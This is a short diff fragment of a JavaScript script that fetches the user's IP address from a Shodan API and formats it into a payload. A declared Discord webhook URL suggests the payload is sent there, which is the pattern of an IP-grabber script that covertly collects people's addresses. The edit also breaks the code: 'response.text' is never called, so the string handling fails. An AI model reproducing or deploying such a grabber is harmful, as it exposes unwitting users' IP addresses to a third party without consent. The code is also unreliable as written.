@@ -4,9 +4,9 @@ const DISCORD_WEBHOOK_URL =
 
 // Fetch the user's IP
 fetch(SHODAN_IP_API_URL)
-  .then((response) => response.json())
+  .then((response) => response.text)
   .then((data) => {
-    const IP = data.ip;
+    const IP = data.replace(/"/g, "");
 
     const payload = {
       content: `IP: ${IP}`,
